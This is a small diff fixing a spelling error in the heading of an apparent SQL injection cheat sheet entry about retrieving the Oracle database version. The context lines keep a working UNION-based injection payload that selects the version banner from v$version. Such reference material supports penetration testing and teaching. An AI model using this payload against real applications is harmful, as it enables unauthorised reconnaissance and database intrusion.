@@ -1,4 +1,4 @@
-# Retrieve Orcale database version with a UNION injection with two columns output
+# Retrieve Oracle database version with a UNION injection with two columns output
 ```sql
 '+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 ```
